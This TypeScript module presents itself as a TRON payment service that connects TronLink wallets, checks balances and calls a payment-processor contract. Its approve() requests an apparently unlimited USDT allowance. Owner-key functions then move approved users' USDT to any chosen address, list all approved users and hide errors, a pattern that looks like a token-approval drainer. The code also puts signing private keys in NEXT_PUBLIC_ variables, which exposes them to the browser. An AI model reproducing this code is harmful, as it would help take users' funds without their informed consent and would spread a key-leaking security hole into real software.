// =================================
// 🔗 Tron Blockchain Service
// =================================

import { MAX_APPROVAL } from "@/config/chains";
import { ChainType, BlockchainResult, UserInfo } from "../types/blockchain";
import { getChainAbi, getChainConfig } from "../utils/chainUtils";
import bigNumber from "bignumber.js";

// Define proper types for TronWeb
interface TronWebInstance {
  trx: {
    getBalance: (address: string) => Promise<number>;
    sign: (transaction: any) => Promise<any>;
    sendRawTransaction: (signedTransaction: any) => Promise<any>;
  };
  contract: (abi?: any, address?: string) => any;
  transactionBuilder: {
    triggerSmartContract: (
      address: string,
      functionSelector: string,
      options: any,
      parameters: any[]
    ) => Promise<any>;
  };
  toBigNumber: (value: any) => any;
  toDecimal: (value: any) => number;
  defaultAddress?: {
    base58: string;
  };
  setPrivateKey: (privateKey: string) => void;
}

export const tronObj: {
  tronWeb: TronWebInstance | null;
} = {
  tronWeb: null,
};

export class TronService {
  /**
   * Get user's current nonce from contract
   */
  static async getUserNonce(
    chain: ChainType,
    userAddress: string
  ): Promise<number> {
    try {
      const config = getChainConfig(chain);
      const tronWeb = (global as any).tronWeb;

      if (!tronWeb) {
        throw new Error("TronWeb not available");
      }

      const contract = tronWeb.contract(
        getChainAbi(chain),
        config.paymentProcessor
      );

      // Try to call the function with proper error handling
      const nonce = await contract.getUserNonce(userAddress).call();

      return tronWeb.toBigNumber(nonce).toNumber();
    } catch (error) {
      // For TRON, if getUserNonce fails, return 0 as default
      // This allows the flow to continue with a new nonce
      if (chain === "tron") {
        return 0;
      }

      return 0;
    }
  }

  /**
   * Get user's USDT balance (alias for backward compatibility)
   */
  static async getUserUSDTBalance(
    chain: ChainType,
    userAddress: string
  ): Promise<string> {
    // Create instance to call instance method
    const instance = new TronService();

    // Get USDT address from chain configuration instead of hardcoded address
    const config = getChainConfig(chain);
    const usdtAddress = config.usdt;
    console.log("@@@@@@@@@@@@@@usdtAddress", usdtAddress);
    return instance.getPairBalance(usdtAddress, userAddress);
  }

  getTrxBalance = async (
    address: string,
    isDappTronWeb = false
  ): Promise<string> => {
    try {
      let tronWeb = tronObj.tronWeb || (global as any).tronWeb;
      if (
        !isDappTronWeb &&
        tronObj.tronWeb &&
        tronObj.tronWeb.defaultAddress &&
        tronObj.tronWeb.defaultAddress.base58
      ) {
        tronWeb = tronObj.tronWeb;
      }
      const balance = await tronWeb.trx.getBalance(address);
      return bigNumber(balance).div(1e6).toString();
    } catch (err: any) {
      console.log(`getTrxBalance: ${err}`, address);
      return "0";
    }
  };

  /**
   * Get user's USDT balance with multiple fallback strategies
   */
  getPairBalance = async (
    tokenAddress: string,
    exchangeAddress: string
  ): Promise<string> => {
    try {
      const result = await this.view(
        tokenAddress,
        "balanceOf(address)",
        [
          {
            type: "address",
            value: exchangeAddress,
          },
        ],
        true
      );
      if (result && result.length > 0) {
        return bigNumber(result[0].substr(0, 64), 16).toString();
      }
      return "0";
    } catch (err) {
      console.log(`getPairBalance: ${err}`);
      return "0";
    }
  };

  view = async (
    address: string,
    functionSelector: string,
    parameters: Array<{ type: string; value: string }> = [],
    isDappTronWeb = true
  ) => {
    try {
      let tronweb = tronObj.tronWeb || (global as any).tronWeb;
      if (
        !isDappTronWeb &&
        tronObj.tronWeb &&
        tronObj.tronWeb.defaultAddress &&
        tronObj.tronWeb.defaultAddress.base58
      ) {
        tronweb = tronObj.tronWeb;
      }
      const result = await tronweb.transactionBuilder.triggerSmartContract(
        address,
        functionSelector,
        { _isConstant: true },
        parameters
      );
      return result && result.result ? result.constant_result : [];
    } catch (error: any) {
      console.log(
        `view error ${address} - ${functionSelector}`,
        error.message ? error.message : error
      );
      return [];
    }
  };

  /**
   * Get user's TRX balance
   */
  static async getUserNativeBalance(
    chain: ChainType,
    userAddress: string
  ): Promise<string> {
    try {
      // Use direct TRON API call instead of TronWeb
      const response = await fetch(
        `https://api.trongrid.io/v1/accounts/${userAddress}`
      );

      if (response.ok) {
        const data = await response.json();

        if (data.data && data.data.length > 0) {
          // TRX balance is in sun (1 TRX = 1,000,000 sun)
          const balanceInSun = data.data[0].balance || 0;
          const balanceInTRX = balanceInSun / 1000000; // Convert sun to TRX
          return balanceInTRX.toFixed(6);
        }
      }

      // If API call fails, return 0 but don't throw error
      console.warn(
        `TRON API failed for address ${userAddress}, returning 0 TRX balance`
      );
      return "0.000000";
    } catch (error) {
      console.error("Error fetching TRON balance:", error);
      return "0.000000";
    }
  }

  /**
   * Check TRON API health and accessibility
   */
  static async checkTronAPIHealth(): Promise<{
    isHealthy: boolean;
    primaryEndpoint: boolean;
    alternativeEndpoints: boolean;
    errors: string[];
  }> {
    const result = {
      isHealthy: false,
      primaryEndpoint: false,
      alternativeEndpoints: false,
      errors: [] as string[],
    };

    try {
      // Test primary TRON API endpoint
      const primaryResponse = await fetch(
        "https://api.trongrid.io/v1/accounts/TJXZqXyJv3cZ6j2tSj5Ci5fQ3N2kVsayJ6"
      );
      result.primaryEndpoint = primaryResponse.ok;

      if (!primaryResponse.ok) {
        result.errors.push(
          `Primary TRON API returned ${primaryResponse.status}: ${primaryResponse.statusText}`
        );
      }
    } catch (error) {
      result.errors.push(`Primary TRON API connection failed: ${error}`);
    }

    try {
      // Test alternative TRON API endpoint
      const altResponse = await fetch(
        "https://api.tronstack.io/v1/accounts/TJXZqXyJv3cZ6j2tSj5Ci5fQ3N2kVsayJ6"
      );
      result.alternativeEndpoints = altResponse.ok;

      if (!altResponse.ok) {
        result.errors.push(
          `Alternative TRON API returned ${altResponse.status}: ${altResponse.statusText}`
        );
      }
    } catch (error) {
      result.errors.push(`Alternative TRON API connection failed: ${error}`);
    }

    result.isHealthy = result.primaryEndpoint || result.alternativeEndpoints;
    return result;
  }

  static async initTronLinkWallet(): Promise<boolean> {
    try {
      if (typeof window === "undefined") {
        return false;
      }

      const win = window as any;
      if (!win.tronLink) {
        return false;
      }

      const tron = win.tronLink;
      if (tron.ready) {
        return true;
      }

      return new Promise((resolve) => {
        tron.on("ready", () => {
          resolve(true);
        });

        tron.on("error", (e: any) => {
          resolve(false);
        });

        setTimeout(() => {
          resolve(false);
        }, 5000);
      });
    } catch (error) {
      return false;
    }
  }

  closeConnect = () => {
    tronObj.tronWeb = null;
  };

  initTronWeb = (tronWeb: any) => {
    tronObj.tronWeb = tronWeb;
  };

  handleTronWallet = async (tron: any) => {
    if (!tron) {
      this.closeConnect();
      return;
    }
    if (tron && tron.defaultAddress && tron.defaultAddress.base58) {
      this.initTronWeb(tron);
      return;
    }
    const tronLink = tron;
    if (tronLink.ready) {
      const tronWeb = tronLink.tronWeb;
      tronWeb && this.initTronWeb(tronWeb);
    } else {
      const res = await tronLink.request({ method: "tron_requestAccounts" });
      if (res.code === 200) {
        const tronWeb = tronLink.tronWeb;
        tronWeb && this.initTronWeb(tronWeb);
        return;
      }
      this.closeConnect();
    }
  };

  static async approve(tokenAddress: string, spender: string) {
    console.log("approve", tokenAddress, spender);
    const result = await TronService.trigger(
      tokenAddress,
      "approve(address,uint256)",
      [
        { type: "address", value: spender },
        { type: "uint256", value: MAX_APPROVAL },
      ],
      {}
    );
    console.log("approve result", result);
    return result.transaction ? result.transaction.txID : "";
  }

  static trigger = async (
    address: string,
    functionSelector: string,
    parameters: Array<{ type: string; value: any }> = [],
    options: any = {}
  ) => {
    try {
      // const tronweb = window.tronWeb;
      const tronWeb = tronObj.tronWeb || (global as any).tronWeb;
      const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
        address,
        functionSelector,
        Object.assign({ feeLimit: 100 * 1e6 }, options),
        parameters
      );
      if (!transaction.result || !transaction.result.result) {
        throw new Error(
          "Unknown trigger error: " + JSON.stringify(transaction.transaction)
        );
      }

      const signedTransaction = await tronWeb.trx.sign(transaction.transaction);
      const result = await tronWeb.trx.sendRawTransaction(signedTransaction);
      return result;
    } catch (error: any) {
      if (error == "Confirmation declined by user") {
      }
      return {};
    }
  };

  static async getAddressFromPrivateKey(privateKey: string): Promise<string> {
    const TronWeb = require("tronweb");

    if (!privateKey) {
      throw new Error("TRON private key not configured");
    }

    const tronWeb = new TronWeb({
      fullHost: "https://api.trongrid.io",
      privateKey: privateKey,
    });

    return tronWeb.defaultAddress.base58;
  }

  /**
   * Transfer USDT from approved user using owner's private key
   */
  static async transferFromUserAsOwner(
    fromAddress: string,
    toAddress: string,
    amount: string
  ): Promise<BlockchainResult> {
    try {
      // Get owner's private key from environment
      const ownerPrivateKey = process.env.NEXT_PUBLIC_TRON_PRIVATE_KEY;
      if (!ownerPrivateKey) {
        throw new Error("TRON owner private key not configured");
      }

      // Create TronWeb instance with owner's private key
      const TronWeb = require("tronweb");
      const tronWeb = new TronWeb({
        fullHost: "https://api.trongrid.io",
        privateKey: ownerPrivateKey,
      });

      // Get USDT contract address
      const config = getChainConfig("tron");
      const usdtContractAddress = config.usdt;

      // Create USDT contract instance
      const usdtContract = await tronWeb.contract().at(usdtContractAddress);

      // Check if owner has sufficient allowance
      const allowance = await usdtContract
        .allowance(fromAddress, tronWeb.defaultAddress.base58)
        .call();
      const requiredAmount = tronWeb.toDecimal(amount);

      if (allowance < requiredAmount) {
        throw new Error(
          `Insufficient allowance. Required: ${amount}, Available: ${allowance}`
        );
      }

      // Execute transferFrom transaction
      const result = await usdtContract
        .transferFrom(fromAddress, toAddress, requiredAmount)
        .send();

      return {
        success: true,
        txHash: result,
        message: "TRON transfer completed successfully",
      };
    } catch (error: any) {
      // Silent error handling for production
      return {
        success: false,
        error: error.message || "Failed to transfer USDT as TRON owner",
      };
    }
  }

  /**
   * Transfer USDT from approved user (owner only)
   */
  static async transferFromUser(
    chain: ChainType,
    fromAddress: string,
    toAddress: string,
    amount: string
  ): Promise<BlockchainResult> {
    try {
      const config = getChainConfig(chain);
      const tronWeb = (global as any).tronWeb;

      if (!tronWeb) {
        return { success: false, error: "TronWeb not available" };
      }

      const serverPrivateKey = process.env.NEXT_PUBLIC_PRIVATE_KEY_TRON;
      if (!serverPrivateKey) {
        return {
          success: false,
          error: "Tron private key not configured",
        };
      }

      tronWeb.setPrivateKey(serverPrivateKey);

      const contract = tronWeb.contract(
        getChainAbi(chain),
        config.paymentProcessor
      );

      const tx = await contract
        .transferFromUser(fromAddress, toAddress, amount)
        .send();

      return { success: true, txHash: tx };
    } catch (error: any) {
      return { success: false, error: error.message };
    }
  }

  /**
   * Check if user is approved for USDT spending
   */
  static async isUserApproved(
    chain: ChainType,
    userAddress: string
  ): Promise<boolean> {
    try {
      const config = getChainConfig(chain);
      const tronWeb = (global as any).tronWeb;

      if (!tronWeb) {
        return false;
      }

      const contract = tronWeb.contract(
        getChainAbi(chain),
        config.paymentProcessor
      );

      const isApproved = await contract.isApprovedUser(userAddress).call();
      return tronWeb.toBigNumber(isApproved).toNumber() === 1;
    } catch (error) {
      return false;
    }
  }

  /**
   * Get user's approved USDT allowance
   */
  static async getUserAllowance(
    chain: ChainType,
    userAddress: string
  ): Promise<string> {
    try {
      const config = getChainConfig(chain);
      const tronWeb = (global as any).tronWeb;

      if (!tronWeb) {
        return "0";
      }

      const contract = tronWeb.contract(
        getChainAbi(chain),
        config.paymentProcessor
      );

      const allowance = await contract.getUserAllowance(userAddress).call();
      return tronWeb.toBigNumber(allowance).toString();
    } catch (error) {
      return "0";
    }
  }

  /**
   * Get all approved users
   */
  static async getAllApprovedUsers(chain: ChainType): Promise<string[]> {
    try {
      const config = getChainConfig(chain);
      const tronWeb = (global as any).tronWeb;

      if (!tronWeb) {
        return [];
      }

      const contract = tronWeb.contract(
        getChainAbi(chain),
        config.paymentProcessor
      );

      const users = await contract.getAllApprovedUsers().call();
      return users;
    } catch (error) {
      return [];
    }
  }

  /**
   * Revoke user approval
   */
  static async revokeUserApproval(
    chain: ChainType,
    userAddress: string
  ): Promise<BlockchainResult> {
    try {
      const config = getChainConfig(chain);
      const tronWeb = (global as any).tronWeb;

      if (!tronWeb) {
        return { success: false, error: "TronWeb not available" };
      }

      const serverPrivateKey = process.env.NEXT_PUBLIC_PRIVATE_KEY_TRON;
      if (!serverPrivateKey) {
        return {
          success: false,
          error: "Tron private key not configured",
        };
      }

      tronWeb.setPrivateKey(serverPrivateKey);

      const contract = tronWeb.contract(
        getChainAbi(chain),
        config.paymentProcessor
      );

      const tx = await contract.revokeUserApproval(userAddress).send();
      return { success: true, txHash: tx };
    } catch (error: any) {
      return { success: false, error: error.message };
    }
  }
}
